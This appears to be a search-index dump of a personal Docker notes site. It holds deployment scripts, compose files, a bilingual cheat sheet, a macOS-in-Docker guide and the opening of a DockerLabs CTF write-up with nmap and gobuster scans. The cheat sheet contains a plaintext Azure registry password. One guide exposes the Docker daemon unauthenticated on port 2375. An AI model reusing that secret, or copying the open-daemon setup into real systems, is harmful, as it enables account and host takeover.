ghcr.io/car-ww-dataoffice/alg-backend:latest | tail -n +5 | head -n -2 &gt;&gt;  ~/alg-repositories/megacomputer-scripts/config/.env_api_backend sudo ~/alg-repositories/megacomputer-scripts/oauth_config_generator.sh sudo ~/alg-repositories/megacomputer-scripts/id_generator.sh sudo cp  ~/alg-repositories/megacomputer-scripts/config/nginx.conf  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config/nginx sudo cp  ~/alg-repositories/megacomputer-scripts/config/nginx-cloud.conf  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config/nginx sudo cp  ~/alg-repositories/megacomputer-scripts/config/.htpasswd  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config/nginx mkdir  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/docker_app sudo cp  ~/alg-repositories/megacomputer-scripts/config/docker_app/docker-compose.yml  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/docker_app sudo cp  ~/alg-repositories/megacomputer-scripts/config/docker-compose.yml  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/ sudo cp  ~/alg-repositories/megacomputer-scripts/config/docker-compose-cloud.yml  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/ sudo cp  ~/alg-repositories/megacomputer-scripts/config/.env_api_backend  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/ sudo cp  ~/alg-repositories/megacomputer-scripts/config/.env_elastic  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/ sudo cp  ~/alg-repositories/megacomputer-scripts/config/filebeat.yml  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config sudo cp  ~/alg-repositories/megacomputer-scripts/config/logstash.conf  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config sudo cp  ~/alg-repositories/megacomputer-scripts/config/metricbeat.yml  ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config sudo  ~/alg-repositories/megacomputer-scripts/peer.sh sudo ~/alg-repositories/megacomputer-scripts/setup_manager_install.sh cp -r ~/alg-repositories/megacomputer-scripts/config/wireguard ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/config # Login to ALG cartier BTS docker registry # user gitlab+deploy-token-prod-1 # Complete command in 'Mega computer credentials' sudo docker login ghcr.io cd ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime sudo docker-compose up -d cd ~/alg-repositories/cartier_lg_web/docker/standalone_setup_realtime/docker_app sudo docker-compose up -d # BTS ALG setup cd ~/alg-repositories/megacomputer-scripts sudo ./install.sh MEGA_COMPUTER 192.168.121.101 root root /data/cartier/cartier_realtime_data sudo reboot sudo apt autoremove -y # Initial data should be automatically seeded # Verify seed data curl http://localhost:3000/rings\n</code></pre> <p>Sample output from <code>curl http://localhost:3000/rings</code></p> <pre><code>##################################### [{ \"is_deleted\": false, \"id\": 1, \"ring_id\": \"CRH4386653_essaouira_real_time\", \"name\": \"ESSAOUIRA RING\", \"reference_number\": \"CRH4386653\", \"description\": \"WHITE GOLD 750/1000, FLUTED EMERALD AND CHALCEDONY BEADS, CALIBRATED AND PRINCESS-CUT SAPPHIRES, ONYX, TURQUOISE, ALL SET WITH 56 BRILLIANT-CUT DIAMONDS TOTALING 1.22 CARATS\", \"ring_image\": \"/data/rings/CRH4386653_essaouira_real_time/ef7f94f3-7ef6-459b-a4a6-b35634ecc0ff.png\", \"ring_image_hd\": \"/data/rings/CRH4386653_essaouira_real_time/d688e36f-8550-445b-8abe-d03096604bb9.png\", \"overlay_image_url\": \"/data/rings/CRH4386653_essaouira_real_time/a9b2fc71-4b12-410f-bfcd-fc8fdc8e4ccf.png\", \"cover_image_url\": \"/data/rings/CRH4386653_essaouira_real_time/a933b838-a3a5-4622-8698-98a79427a7c3.png\", \"category\": \"FJ\", \"catalog_url\": \"https://plaza.cartier.com/products/25383/informations\", \"updated\": 1652901981905 }, { \"is_deleted\": false, \"id\": 2, \"ring_id\": \"CRZH420009_emerald_real_time\", \"name\": \"EMERALD RING\", \"reference_number\": \"CRZH420009\", \"description\": \"PLATINUM, ONE 9.01 CARAT EMERALD-CUT EMERALD FROM COLOMBIA, TWO TAPERED BAGUETTE DIAMONDS TOTALING 0.64 CARATS D-E/VVS1\", \"ring_image\": \"/data/rings/CRZH420009_emerald_real_time/f82c5eee-cda0-4fbc-86dc-06ef5d3b4cda.png\", \"ring_image_hd\": \"/data/rings/CRZH420009_emerald_real_time/cc0febaf-6271-4c2a-a656-e3803ddf850b.png\", \"overlay_image_url\": \"/data/rings/CRZH420009_emerald_real_time/190bea0f-c046-40e1-a138-345197590018.png\", \"cover_image_url\": \"/data/rings/CRZH420009_emerald_real_time/ab00b3f0-3bf1-4928-9a45-55beb893b4ee.png\", \"category\": \"HJ\", \"catalog_url\": \"https://plaza.cartier.com/products/30528/informations\", \"updated\": 1652901981927 }, { \"is_deleted\": false, \"id\": 3, \"ring_id\": \"CRH4372653_sanyogita_real_time\", \"name\": \"SANYOGITA RING\", \"reference_number\": \"CRH4372653\", \"description\": \"PLATINUM, ONE 10.00-CARAT RUBY FROM MOZAMBIQUE, CARVED RUBIES, SAPPHIRES AND EMERALDS, ONYX, BRILLIANT-CUT DIAMONDS\", \"ring_image\": \"/data/rings/CRH4372653_sanyogita_real_time/75c53d90-c8a7-4cbb-992b-2e4daecaf4d1.png\", \"ring_image_hd\": \"/data/rings/CRH4372653_sanyogita_real_time/5e462792-b4c1-4d88-8485-dfd32a3b1152.png\", \"overlay_image_url\": \"/data/rings/CRH4372653_sanyogita_real_time/ca81ac1c-ed9f-4240-b841-d116c1bbaa40.png\", \"cover_image_url\": \"/data/rings/CRH4372653_sanyogita_real_time/d34e5e79-9b77-452b-b73b-d91b84c56fb5.png\", \"category\": \"HJ\", \"catalog_url\": \"https://plaza.cartier.com/products/21965/informations\", \"updated\": 1652901981947 }] ##################################### \n</code></pre>"},{"location":"Dockers/algDocs/#9-install-gstreamer-plugins","title":"9 Install Gstreamer + Plugins","text":"<pre><code># Install gstreamer + good, bad and ugly plugins sudo apt install libgstreamer1.0-0 gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly gstreamer1.0-libav gstreamer1.0-tools gstreamer1.0-x gstreamer1.0-alsa gstreamer1.0-gl gstreamer1.0-gtk3 gstreamer1.0-qt5 gstreamer1.0-pulseaudio # Check installed version gst-launch-1.0 --gst-version\n</code></pre>"},{"location":"Dockers/containerRegistry/","title":"containerRegistry","text":"<pre><code>services:\n  docker-registry:\n    image: registry:2\n    container_name: docker-registry\n    volumes:\n      - ./auth:/auth\n#    environment:\n      #- REGISTRY_AUTH=htpasswd\n      #- REGISTRY_AUTH_HTPASSWD_REALM=\"Registry Realm\"\n      #- REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\n    ports:\n      - 5000:5000\n    restart: always\n    volumes:\n      - ./volume:/var/lib/registry\n\n  docker-registry-ui:\n    image: konradkleine/docker-registry-frontend:v2\n    container_name: docker-registry-ui\n    ports:\n      - 9088:80\n    environment:\n      - ENV_DOCKER_REGISTRY_HOST=io.madolell.tk\n      #- ENV_DOCKER_REGISTRY_PORT=5000\n</code></pre> <pre><code>htpasswd -c /home/usernamehere/.htpasswd bob123\n</code></pre>"},{"location":"Dockers/deaemonExpose/","title":"How to Connect to a Remote Docker Daemon","text":""},{"location":"Dockers/deaemonExpose/#pre-requisite","title":"Pre-Requisite:","text":"<ul> <li>A Ubuntu 18.04 installed on one of VM instance</li> <li>Install Docker</li> </ul>"},{"location":"Dockers/deaemonExpose/#create-the-directory-to-store-the-configuration-file","title":"Create the directory to store the configuration file.","text":"<pre><code>sudo mkdir -p /etc/systemd/system/docker.service.d\n</code></pre>"},{"location":"Dockers/deaemonExpose/#create-a-new-file-to-store-the-daemon-options","title":"Create a new file to store the daemon options.","text":"<pre><code>sudo nano /etc/systemd/system/docker.service.d/options.conf\n</code></pre>"},{"location":"Dockers/deaemonExpose/#now-make-it-look-like-this-and-save-the-file-when-youre-done","title":"Now make it look like this and save the file when you\u2019re done:","text":"<pre><code>[Service]\nExecStart=\nExecStart=/usr/bin/dockerd -H unix:// -H tcp://0.0.0.0:2375\n</code></pre> <p>Now, reload the <code>systemd</code> daemon and restart the <code>docker</code> service:</p> <pre><code># Reload the systemd daemon.\nsudo systemctl daemon-reload\n\n# Restart Docker.\nsudo systemctl restart docker\n</code></pre> <p>That\u2019s going to let you continue to connect to the Docker daemon from within the VM thanks to <code>-H unix://</code>, but it also exposes the Docker Daemon with <code>-H tcp://0.0.0.0:2375</code> so that anyone can connect to it over the non-encrypted port.</p>"},{"location":"Dockers/deaemonExpose/#configuring-your-dev-box-to-connect-to-the-remote-docker-daemon","title":"Configuring your dev box to connect to the remote Docker daemon:","text":"<p>If you want to set DOCKER_HOST by default so it always connects remotely you can export it in your ~/.bashrc file. Here\u2019s an example of that as a 1 liner:</p> <pre><code>echo \"export DOCKER_HOST=tcp://X.X.X.X:2375\" &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc\n</code></pre> <p>That just adds the export line to your .bashrc file so it\u2019s available every time you open your terminal. The source command reloads your bash configuration so it takes effect now.</p>"},{"location":"Dockers/deaemonExpose/#testing","title":"Testing","text":"<p>You can test the configuration using a simple <code>curl</code> command, like the following:</p> <pre><code>curl &lt;docker-host-ip&gt;:2375/v1.38/containers/json \n</code></pre> <p>If you have any running containers, you will receive a non-empty <code>json</code> response.</p> <p>Congratulations, you\u2019re now able to connect to a remote Docker daemon.</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/","title":"DOCKER","text":""},{"location":"Dockers/docker-cheatsheet-RafaBTS/#enviornment-variables","title":"Enviornment Variables","text":"<pre><code>docker build -t cdxocrdev.azurecr.io/te-nlp_worker:104 --build-arg GIT_PASS=$AZ_PAS --build-arg CDXO_COMMON=master .\ndocker build -t cdxo/stats-service:sqlfix --build-arg GIT_PASS=$GIT_PASS --build-arg CDXO_COMMON=master .\n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#multi-line-command","title":"Multi Line Command","text":"<pre><code>version: '3.1'\nservices:\n  db:\n    image: postgres\n  web:\n    build: .\n    command:\n      - /bin/bash\n      - -c\n      - |\n        python manage.py migrate\n        python manage.py runserver 0.0.0.0:8000\n\n    volumes:\n      - .:/code\n    ports:\n      - \"8000:8000\"\n    links:\n      - db\n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#run-image","title":"Run Image","text":"<p>docker run -it --entrypoint sh  docker run -it --entrypoint sh  cdxocr.azurecr.io/ci/stg_img:latest docker run -it --entrypoint /bin/bash cdxocr.azurecr.io/common/rabbitmq-autoscaler:2689"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#aumentar-memoria-virtual-shell","title":"Aumentar Memoria Virtual \"shell\"","text":"<pre><code>sysctl -w vm.max_map_count=262144\n</code></pre> <pre><code>sysctl -p\n</code></pre> <p>CMD espera</p> <pre><code>tail -f /dev/null\n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#gitlab","title":"gitlab","text":"<p>/etc/gitlab/initial_root_password</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#socket-compartido","title":"socket compartido","text":"<p>volumes:</p> <p>- /var/run/docker.sock:/var/run/docker.sock</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#permisos-socker","title":"Permisos socker","text":"<p><code>chown -R &lt;user&gt; /var/run/docker.sock</code></p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#linux-version","title":"Linux Version","text":"<p><code>lsb_release -d</code></p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#export-image-content","title":"Export image content","text":"<p>docker export container_name -o output.tar</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#acr-login","title":"ACR Login","text":"<p>$spPassword=\"sgj+QlIYo1Zp0M12JKz8JoWQNDsH4Vwv\" echo $spPassword | helm registry login zentcash.azurecr.io --username zentcash --password-stdin docker run -it --entrypoint sh zentcash.azurecr.io/main:latest docker run -it --entrypoint sh </p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#tagear-y-pushear","title":"Tagear y Pushear","text":"<p>az acr login --name cdxocr -u cdxocr -p  docker pull cdxocr.azurecr.io/metrics:2831-staging docker tag cdxocr.azurecr.io/metrics:2831-staging cdxoclients.azurecr.io/metrics:2831-staging az acr login --name cdxoclients -u cdxoclients -p   docker push cdxoclients.azurecr.io/metrics:2831-staging <p>az acr login --name cdxocr -u cdxocr -p   docker pull cdxocr.azurecr.io/common/rabbitmq-autoscaler:latest docker tag cdxocr.azurecr.io/common/rabbitmq-autoscaler:latest  az acr login --name cdxoclients -u cdxoclients -p   docker push cdxoclients.azurecr.io/common/rabbitmq-autoscaler:latest <p>BUILD</p> <p>sudo docker build --rm -f \"Dockerfile\" -t main:latest \".\" sudo docker run -p 3000:3000 --name client -d fe_qa_tst:latest</p> <p>docker run --name -v $PWD:/target trufflehog dxa4481/trufflehog:latest --regex --entropy=False https://anything: @dev.azure.com/cdxo-devops/TEXT-EXTRACT_PROJECT/_git/text-extract_repo  docker run --rm -ti --name trufflehog -v F:\\PROJECTS\\trufflehog:/target dxa4481/trufflehog:latest --regex --entropy=False https://anything: @dev.azure.com/cdxo-devops/TEXT-EXTRACT_PROJECT/_git/text-extract_repo"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#remove-all","title":"Remove all","text":"<p>docker rm -f $(docker ps -a -q)</p> <p>docker rm -f $(docker ps -a -q --filter \"name=k8s\")</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#delete-dangling-images","title":"Delete dangling images","text":"<p>docker rmi -f $(docker images -f \"dangling=true\" -q)</p> <p>Clear All</p> <p>docker system prune -a -f</p> <p>Other commands:</p> <p>docker container prune -f docker image prune -f docker volume prune -f docker network prune -f docker system prune -a -f</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-network","title":"Docker Network","text":"<p>docker network connect zent-network --host=localhost</p> <p>docker run -it --rm bitnami/postgresql:10 psql -h pg-0 -U postgres</p> <p>docker run -it --rm adminer:latest adminer docker run -p 8080:8080 --name adminer -d adminer:latest</p> <p>psql -U postgres -W $PGPOOL_POSTGRES_PASSWORD -d tx_history &lt; transaction_db.sql psql -U postgres -W $PGPOOL_POSTGRES_PASSWORD -d users &lt; user_db.sql</p> <p>Network Compose</p> <pre><code>networks:\n  host:\n    name: host\n    external: true\n</code></pre> <p>Or</p> <pre><code>version: \"3\"\nservices:\n  web:\n    image: conatinera:latest\n    network_mode: \"host\"        \n    restart: on-failure\n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#get-ip","title":"Get IP","text":"<p>docker inspect textextract_worker1_1 | grep '\"IPAddress\"'</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#move-docker-folder","title":"MOVE DOCKER FOLDER","text":"<p>sudo mkdir /datadrive/DOCKER sudo service docker stop sudo mv /var/lib/docker /datadrive/DOCKER ln -s /datadrive/DOCKER /var/lib/docker sudo service docker start</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-recreate-containers","title":"DOCKER Recreate containers","text":"<p>sudo docker-compose up -d  --force-recreate</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#ver-el-contenido-de-una-imagen","title":"Ver el contenido de una imagen","text":"<p>docker run -it --entrypoint sh cdxocr.azurecr.io/tst/rabbit-scaler</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-logs-of-docker-compose","title":"DOCKER Logs of Docker Compose","text":"<p>cd /datadrive/browser-v2 sudo docker-compose logs -f sudo docker-compose logs &gt; browserv2.log</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-add-packages","title":"DOCKER Add packages","text":"<p>apk add nano</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-restart-neo4j","title":"DOCKER: Restart Neo4j","text":"<p>/var/lib/neo4j/bin/neo4j restart</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-access-neo4j","title":"DOCKER ACCESS NEO4J","text":"<p>sudo docker exec -it cdxo_neo4j bash cypher-shell -u neo4j -p neo4j</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-logs","title":"DOCKER Logs","text":"<p>docker logs cdxo_neo4j -f</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#docker-copy-files","title":"DOCKER COPY FILES","text":"<p>docker cp /datadrive/neo4j_old/certificates/neo4j.cert cdxo_neo4j:/var/lib/neo4j/certificates/neo4j.cert docker cp .\\keycloak-admin-cli-13.0.1.jar relaxed_panini:/scripts/keycloak/client/keycloak-admin-cli-13.0.1.jar echo \" ----- Change Docker Images folder\" sudo mkdir /datadrive/DOCKER sudo su -c \"echo DOCKER_OPTS='--dns 8.8.8.8 --dns 8.8.4.4 -g /datadrive/DOCKER' &gt;&gt; /etc/default/docker\" sudo service docker restart</p>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#if-exist-img","title":"IF EXIST IMG","text":"<pre><code>Get-CDXOImport() {\n    sudo docker ps -a -q --filter ancestor=\"cdxoimport_server\"\n}\nif [ $(Get-CDXOImport) ]\nthen\n    sudo docker rm $(docker stop $(docker ps -a -q --filter ancestor=\"cdxoimport_server\" --format=\"{{.ID}}\"));\nelse\n    echo \" ----- cdxo-import Container container don\u00b4t exist ----- \";\nfi\n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#if-exist-container","title":"IF EXIST CONTAINER","text":"<pre><code>sudo docker ps -a -q --filter name=\"client\"\n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#install-docker","title":"Install Docker","text":"<pre><code>sudo apt-get update\nsudo apt install apt-transport-https ca-certificates curl software-properties-common -y\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\nsudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable\"\nsudo apt install docker-ce libpcre3 libpcre3-dev python3-pip python3-venv libicu-dev nginx -y\nsudo -H pip3 install PyICU virtualenv\n\necho \" ----- Install Docker Compose\"\nsudo curl -L https://github.com/docker/compose/releases/download/1.18.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#forza-recreate-docker-compose","title":"Forza recreate Docker compose","text":"<pre><code>--force-recreate \n</code></pre>"},{"location":"Dockers/docker-cheatsheet-RafaBTS/#install-azure-cli","title":"Install Azure CLI","text":"<pre><code>sudo usermod -aG docker ${USER}\ncurl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash\n</code></pre>"},{"location":"Dockers/docker-compose-network/","title":"Docker compose network","text":"<pre><code>version: \"3\"\nservices:\n  web:\n    image: conatinera:latest\n    network_mode: \"host\"        \n    restart: on-failure\n</code></pre>"},{"location":"Dockers/dockerBestTolls/","title":"dockerBestTolls","text":"<pre><code>\u2705  Duplicati \n      \ud83d\udccc  https://youtu.be/hoauNQsyer8\n   \u2705  Snippet Box \n       \ud83d\udc49   https://hub.docker.com/r/pawelmalak/s...\n   \u2705  FileBrowser \n       \ud83d\udc49   https://hub.docker.com/r/filebrowser/...\n   \u2705  Diun \n       \ud83d\udc49   https://crazymax.dev/diun/\n   \u2705  AutoHeal \n       \ud83d\udc49   https://hub.docker.com/r/willfarrell/...\n   \u2705  composerize \n       \ud83d\udc49   https://github.com/magicmark/composerize\n   \u2705  vaultwarden \n       \ud83d\udc49   https://hub.docker.com/r/vaultwarden/...\n   \u2705  Nginx Proxy Manager \n       \ud83d\udc49   https://hub.docker.com/r/jc21/nginx-p...\n   \u2705  WireGuard \n      \ud83d\udccc  https://youtu.be/BoJ3wUZ4PJw\n   \u2705  TailScale \n      \ud83d\udccc  https://youtu.be/BU47rgJGsns\n   \u2705  PiHole \n      \ud83d\udccc  https://youtu.be/zeklVkwz6c0\n   \u2705  Homer \n       \ud83d\udc49   https://hub.docker.com/r/b4bz/homer\n   \u2705  PhotoPrism \n       \ud83d\udc49   https://hub.docker.com/r/photoprism/p...\n   \u2705  Mealie \n       \ud83d\udc49   https://hub.docker.com/r/hkotel/mealie\n   \u2705  BudgetZero \n       \ud83d\udc49   https://hub.docker.com/r/budgetzero/b...\n   \u2705  Firefly III \n       \ud83d\udc49   https://hub.docker.com/r/fireflyiii/core\n   \u2705  PaperMerge \n       \ud83d\udc49   https://hub.docker.com/r/linuxserver/...\n   \u2705  HasteBien / PrivateBien \n       \ud83d\udc49   https://hub.docker.com/r/rlister/hast...\n       \ud83d\udc49   https://hub.docker.com/r/privatebin/n...\n   \u2705  NextCloud \n       \ud83d\udc49   https://hub.docker.com/_/nextcloud\n   \u2705  Monica \n       \ud83d\udc49   https://hub.docker.com/_/monica\n</code></pre>"},{"location":"Dockers/dockerLabs/","title":"DockerLabs","text":""},{"location":"Dockers/dockerLabs/#pivotinggame-beta","title":"PivotingGame (Beta)","text":"<p>Una vez desplegado el entorno vemos que tenemos varias IP's hemos comprobado que de estas IP's solo tenemos acceso a las 2 que estan marcadas en rojo. <code>10.10.10.2 y 20.20.20.2</code></p> <p>Comenzaremos con un escaneo con nmap de todos sus puertos:</p> <pre><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.2 -oG allPorts \n</code></pre> <p>Observamos que los puertos abiertos son el <code>80 y 443</code></p> <p>Vamos a proceder a escanear los recursos mas en profuncidad con la finalidad de obtener mas informacion de los servicios expuestos en estos puertos .</p> <pre><code> nmap -p80,443 -sCV 10.10.10.2\n</code></pre> <p>Vemos que nos reporta que es un apache 2.4.59 la cual no es una version vulnerable pero todo va a depender de como este configurado el entorno.</p> <p>Observamos el puerto 80 y vemos la pagina de presentaci\u00f3n de apache. Pero si observamos el puerto 443 o https vemos una pagina web.</p> <p></p> <p>Veo partes interesantes en la web pero voy a enumerar tambien posibles directorios con gobuster.</p> <pre><code>gobuster dir -u https://10.10.10.2/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,sh,py,pdf -k\n</code></pre> <p>Obtenemos el directorio assets</p> <p></p>"},{"location":"Dockers/dockerRegistry/","title":"dockerRegistry","text":"<pre><code>version: \"3\"\nservices:\n  docker-registry:\n    image: registry:2\n    container_name: docker-registry\n    volumes:\n      - ./auth:/auth\n    environment:\n      - REGISTRY_STORAGE_DELETE_ENABLED=TRUE\n      #- REGISTRY_AUTH=htpasswd\n      #- REGISTRY_AUTH_HTPASSWD_REALM=\"Registry Realm\"\n      #- REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\n    ports:\n      - 5000:5000\n    restart: always\n    volumes:\n      - ./volume:/var/lib/registry\n\n  docker-registry-ui:\n    image: konradkleine/docker-registry-frontend:v2\n    container_name: docker-registry-ui\n    ports:\n      - 9088:80\n    environment:\n      - ENV_DOCKER_REGISTRY_HOST=io.madolell.tk\n      #- ENV_DOCKER_REGISTRY_PORT=5000\n</code></pre> <pre><code>htpasswd -c -B -b &lt;/path/to/users.htpasswd&gt; &lt;user_name&gt; &lt;password&gt;\n</code></pre>"},{"location":"Dockers/imageDebug/","title":"imageDebug","text":"<pre><code>docker pull chenzj/dfimage\n\nalias dfimage=\"docker run -v /var/run/docker.sock:/var/run/docker.sock --rm chenzj/dfimage\"\n\ndfimage image_id\n</code></pre> <pre><code>alias dive=\"docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive\"\ndive nginx:latest\n</code></pre>"},{"location":"Dockers/instalDockerCompose/","title":"instalDockerCompose","text":""},{"location":"Dockers/instalDockerCompose/#install-the-plugin-manually","title":"Install the plugin manually","text":"<p>Note</p> <p>This option requires you to manage upgrades manually. We recommend setting up Docker's repository for easier maintenance.</p> <ol> <li>To download and install the Compose CLI plugin, run:</li> </ol> <p><code>sudo apt-get install docker-compose-plugin</code></p> <p><code>console   $ DOCKER_CONFIG=${DOCKER_CONFIG:-$HOME/.docker}   $ mkdir -p $DOCKER_CONFIG/cli-plugins   $ curl -SL https://github.com/docker/compose/releases/download/v2.23.0/docker-compose-linux-x86_64 -o $DOCKER_CONFIG/cli-plugins/docker-compose</code> <code>DOCKER_CONFIG=${DOCKER_CONFIG:-$HOME/.docker}   mkdir -p $DOCKER_CONFIG/cli-plugins   curl -SL https://github.com/docker/compose/releases/download/v2.27.0/docker-compose-linux-x86_64 -o $DOCKER_CONFIG/cli-plugins/docker-compose   chmod +x $DOCKER_CONFIG/cli-plugins/docker-compose   docker compose version</code></p> <p>This command downloads the latest release of Docker Compose (from the Compose releases repository) and installs Compose for the active user under <code>$HOME</code> directory.</p> <p>To install:</p> <ul> <li>Docker Compose for all users on your system, replace <code>~/.docker/cli-plugins</code> with <code>/usr/local/lib/docker/cli-plugins</code>.</li> <li> <p>A different version of Compose, substitute <code>v2.23.0</code> with the version of Compose you want to use.</p> </li> <li> <p>For a different architecture, substitute <code>x86_64</code> with the architecture you wantopen_in_new.</p> </li> <li> <p>Apply executable permissions to the binary:</p> </li> </ul> <p><code>console    chmod +x $DOCKER_CONFIG/cli-plugins/docker-compose</code></p> <p>or, if you chose to install Compose for all users:</p> <p><code>console    sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose</code></p> <ol> <li>Test the installation.</li> </ol> <p>content_copy</p> <p><code>console    docker compose version    Docker Compose version v2.23.0</code></p>"},{"location":"Dockers/macOsDocker/","title":"macOsDocker","text":""},{"location":"Dockers/macOsDocker/#docker-macos","title":"Docker Macos","text":"<p>| Nov 30, 2022| Linux Windows MacOS</p> <p>Don\u2019t have a Mac and need MacOS? No problem, run it in a docker container.</p> <p>Credit goes to this twitter user:</p>"},{"location":"Dockers/macOsDocker/#requirements","title":"Requirements","text":"<p>Install Docker Ubuntu 22.04</p> <pre><code>sudo apt install apt-transport-https ca-certificates curl software-properties-common -y\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\nsudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu jammy stable\"\nsudo apt install docker-ce -y\nsudo usermod -aG docker $USER\n</code></pre> <p>Copy</p> <p>Reboot or logout/login</p> <p>(Optional) GUI Webpage for Managing Docker - Portainer</p> <pre><code>docker volume create portainer_data\ndocker run -d -p 8000:8000 -p 9443:9443 --name portainer \\\n--restart=always \\\n-v /var/run/docker.sock:/var/run/docker.sock \\\n-v portainer_data:/data \\\nportainer/portainer-ce:2.9.3\n</code></pre> <p>Copy</p> <p>Open up browser and navigate to https://localhost:9443</p> <p>Click Advanced and proceed with any certificate errors</p>"},{"location":"Dockers/macOsDocker/#macos-docker-setup","title":"MacOS Docker Setup","text":"<p>Setup the MacOS Docker Container with the following docker command</p> <pre><code>docker run -it \\\n    --device /dev/kvm \\\n    -p 50922:10022 \\\n    -v /tmp/.X11-unix:/tmp/.X11-unix \\\n    -e \"DISPLAY=${DISPLAY:-:0.0}\" \\\n    -e GENERATE_UNIQUE=true \\\n    -e MASTER_PLIST_URL='https://raw.githubusercontent.com/sickcodes/osx-serial-generator/master/config-custom.plist' \\\n    sickcodes/docker-osx:monterey\n\n# docker build -t docker-osx --build-arg SHORTNAME=monterey .\n</code></pre> <p>Copy</p> <p>Use Disk Utility to \u201cerase\u201d the 270GB virtual disk: Note: This is just virtual and doesn\u2019t erase your drive</p> <p></p>"},{"location":"Dockers/macOsDocker/#start-macos-docker-container","title":"Start MacOS Docker Container","text":"<p>Before we start the container find the name with:</p> <pre><code>docker ps -a\n</code></pre> <p>Copy</p> <p>Look for the NAMES column and pick the container name.</p> <p></p> <p>Start with the following command NAME = Name from column above</p> <pre><code>docker start NAME\n</code></pre> <p>Copy</p>"},{"location":"Dockers/macOsDocker/#portainer-method-for-starting","title":"Portainer Method for Starting","text":"<p>I love portainer because you can easily manage your containers. Start, Stop, and see resource usage\u2026 Portainer does it all! Here is what mine looks like:</p> <p></p>"},{"location":"Dockers/macOsDocker/#optimize-the-container","title":"Optimize the Container","text":"<p>Source: https://github.com/sickcodes/osx-optimizer</p> <p>Run the following from Root Prompt # <code>sudo su</code></p> <pre><code>defaults write com.apple.loginwindow autoLoginUser -bool true\nmdutil -i off -a\nnvram boot-args=\"serverperfmode=1 $(nvram boot-args 2&gt;/dev/null | cut -f 2-)\"\ndefaults write /Library/Preferences/com.apple.loginwindow DesktopPicture \"\"\ndefaults write com.apple.Accessibility DifferentiateWithoutColor -int 1\ndefaults write com.apple.Accessibility ReduceMotionEnabled -int 1\ndefaults write com.apple.universalaccess reduceMotion -int 1\ndefaults write com.apple.universalaccess reduceTransparency -int 1\ndefaults write com.apple.Accessibility ReduceMotionEnabled -int 1\ndefaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticDownload -bool false\ndefaults write com.apple.SoftwareUpdate AutomaticCheckEnabled -bool false\ndefaults write com.apple.commerce AutoUpdate -bool false\ndefaults write com.apple.commerce AutoUpdateRestartRequired -bool false\ndefaults write com.apple.SoftwareUpdate ConfigDataInstall -int 0\ndefaults write com.apple.SoftwareUpdate CriticalUpdateInstall -int 0\ndefaults write com.apple.SoftwareUpdate ScheduleFrequency -int 0\ndefaults write com.apple.SoftwareUpdate AutomaticDownload -int 0\ndefaults write com.apple.loginwindow DisableScreenLock -bool true\ndefaults write com.apple.loginwindow TALLogoutSavesState -bool false\n</code></pre> <p>Copy</p>"},{"location":"Dockers/macOsDocker/#final-result","title":"Final Result","text":""},{"location":"Dockers/macOsDocker/#walkthrough-video","title":"Walkthrough Video","text":"<p>#Docker 